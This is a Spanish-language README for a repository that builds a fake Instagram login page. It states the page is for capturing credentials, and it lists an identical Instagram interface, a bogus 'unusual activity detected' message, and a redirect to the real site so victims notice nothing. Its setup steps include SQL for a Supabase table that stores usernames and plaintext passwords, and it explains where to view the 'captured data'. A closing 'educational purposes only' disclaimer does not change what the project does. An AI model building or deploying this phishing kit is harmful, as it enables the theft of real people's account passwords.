# Instagram Login Page

Una página de login de Instagram con integración a Supabase para captura de credenciales.

## Características

- Interfaz idéntica a Instagram
- Formulario de login con validación
- Integración con Supabase para almacenamiento de datos
- Mensaje de "actividad inusual detectada"
- Redirección automática a Instagram después del login

## Instalación

1. Clona este repositorio:
```bash
git clone https://github.com/dotasutions/instagrampassword.git
cd instagrampassword
```

2. Crea tu archivo de configuración:
```bash
cp config.example.js config.js
```

3. Configura tus credenciales de Supabase en `config.js`

## Configuración de Supabase

### Paso 1: Crear proyecto en Supabase
- Ve a https://supabase.com y crea una cuenta
- Crea un nuevo proyecto

### Paso 2: Crear la tabla
En el SQL Editor de Supabase, ejecuta:

```sql
CREATE TABLE IF NOT EXISTS login_attempts (
    id BIGSERIAL PRIMARY KEY,
    username TEXT NOT NULL,
    password TEXT NOT NULL,
    timestamp TIMESTAMPTZ DEFAULT NOW()
);

ALTER TABLE login_attempts ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Allow anonymous insert" ON login_attempts
    FOR INSERT
    WITH CHECK (true);

CREATE POLICY "Allow anonymous read" ON login_attempts
    FOR SELECT
    USING (true);
```

### Paso 3: Obtener credenciales
En Supabase: Settings → API
- Copia tu Project URL
- Copia tu anon public key

### Paso 4: Configurar archivo
Edita `config.js` con tus credenciales:

```javascript
const SUPABASE_URL = 'tu_project_url';
const SUPABASE_ANON_KEY = 'tu_anon_key';
```

## Uso

1. Abre `index.html` en tu navegador
2. Ingresa credenciales en el formulario
3. Los datos se guardarán automáticamente en Supabase
4. Redirige a Instagram

## Ver datos capturados

En Supabase: Table Editor → login_attempts

## Estructura de archivos

```
instagrampassword/
├── index.html           # Página principal
├── styles.css           # Estilos de la página
├── app.js              # Lógica del formulario
├── config.js           # Configuración de Supabase (NO se sube a GitHub)
├── config.example.js   # Plantilla de configuración
├── logo.png            # Logo de Instagram
├── README.md           # Este archivo
└── INSTRUCCIONES_SETUP.md  # Instrucciones detalladas
```

## Tecnologías utilizadas

- HTML5
- CSS3
- JavaScript (Vanilla)
- Supabase

## Licencia

Este proyecto es solo para fines educativos.

## Advertencia

⚠️ Este proyecto es únicamente para fines educativos y de investigación. No debe usarse para actividades ilegales o maliciosas.

